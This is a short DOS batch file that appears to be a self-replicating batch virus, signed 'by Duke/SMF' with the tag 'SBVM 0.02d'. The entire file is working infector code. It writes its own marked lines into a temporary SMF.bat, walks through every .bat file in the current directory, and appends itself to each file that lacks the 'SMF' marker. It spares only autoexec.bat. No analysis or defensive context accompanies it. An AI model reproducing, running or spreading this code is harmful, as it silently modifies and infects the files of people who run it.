@echo off %SMF%
if -%1==-@ goto SMFz
echo.>SMF.bat
find "SMF"<%0>>SMF.bat
for %%b in (*.bat) do call SMF.bat @ %%b
del SMF.bat
goto SMF
:SMFz [SBVM 0.02d]
if -%2==-autoexec.bat goto SMF
find "SMF"<%2>nul
if errorlevel 1 type SMF.bat>>%2
:SMF by Duke/SMF
